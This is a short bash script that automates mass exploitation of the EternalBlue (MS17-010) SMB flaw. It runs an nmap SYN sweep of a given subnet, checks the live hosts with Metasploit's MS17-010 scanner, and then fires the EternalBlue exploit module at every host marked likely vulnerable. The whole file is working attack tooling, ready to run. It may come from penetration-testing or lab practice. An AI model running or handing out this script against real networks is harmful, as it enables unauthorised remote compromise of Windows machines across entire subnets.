#!/bin/bash

if [[ $EUID -ne 0 ]]; then
    printf 'Must be run as root, exiting!\n'
    exit 1
fi

if [[ $# != 1 ]]; then
    echo "Usage: $0 [subnet]"
    echo "Example: $0 10.0.2.1/24"
    exit 1
fi

if [[ -d nmap ]]; then
    echo "Nmap directory detected"
    cd nmap
else
    echo "Creating Nmap directory"
    mkdir nmap && cd nmap
fi

echo "[*] Starting Nmap scan for live hosts..."
nmap -v0 -sS -n --open -oN hosts -T5 $1

echo "[*] Cleaning up live hosts..."
grep "for" hosts | cut -d " " -f 5 > live_hosts.txt

echo "[*] Starting EternalBlue Scanner..."
msfconsole -q -x "use scanner/smb/smb_ms17_010; set rhosts file://live_hosts.txt; exploit; quit" | tee smb_ms17_010-scanned.txt

echo "[*] Searching for Vulnerable Targets"
grep -i "likely vulnerable" smb_ms17_010-scanned.txt | cut -d " " -f 2 | cut -d ":" -f 1 >> blue_targets.txt

echo "[*] Attempting to exploit Vulnerable Targets"
msfconsole -q -x "use windows/smb/ms17_010_eternalblue; set rhosts file://blue_targets.txt; exploit"
